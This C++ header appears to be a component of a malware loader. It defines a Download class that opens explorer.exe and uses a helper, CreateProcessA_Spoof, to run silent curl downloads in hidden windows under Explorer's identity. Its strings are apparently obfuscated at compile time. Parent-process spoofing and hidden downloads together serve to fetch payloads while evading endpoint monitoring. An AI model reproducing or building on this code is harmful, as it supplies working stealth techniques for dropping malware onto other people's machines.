#pragma once
#include "util.h"
#include <map>

class Download {
private:
	HANDLE hExplorerProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPIDByProcessName("explorer.exe"e));

	struct DownloadStatus {
		HANDLE hProcess = 0;
		DWORD dwExitCode = -1;
	};
	std::map<std::string, DownloadStatus> DownloadList;

public:
	Download() { verify(hExplorerProcess); }
	~Download() { CloseHandle(hExplorerProcess); }

	bool AddDownload(std::string Url, std::string Path) {
		std::string Command = "curl --silent --output "e;
		Command += (std::string)"\""e;
		Command += Path;
		Command += (std::string)"\""e;
		Command += (std::string)" --create-dirs --url "e;
		Command += (std::string)"\""e;
		Command += Url;
		Command += (std::string)"\""e;

		STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA) };
		PROCESS_INFORMATION pi = {};
		if (!CreateProcessA_Spoof(hExplorerProcess, 0, Command.data(), 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &si, &pi))
			return false;

		CloseHandle(pi.hThread);
		DownloadList[Url + Path] = { pi.hProcess, (DWORD)-1 };
		return true;
	}

	DWORD GetExitCode(std::string Url, std::string Path) {
		return DownloadList[Url + Path].dwExitCode;
	}

	void UpdateDownloadStatus() {
		for (auto& Elem : DownloadList) {
			DownloadStatus& Status = Elem.second;
			if (!Status.hProcess)
				continue;

			if (WaitForSingleObject(Status.hProcess, 0) == WAIT_TIMEOUT)
				continue;

			DWORD dwExitCode;
			if (!GetExitCodeProcess(Status.hProcess, &dwExitCode))
				continue;

			CloseHandle(Status.hProcess);
			Status = { 0, dwExitCode };
		}
	}
};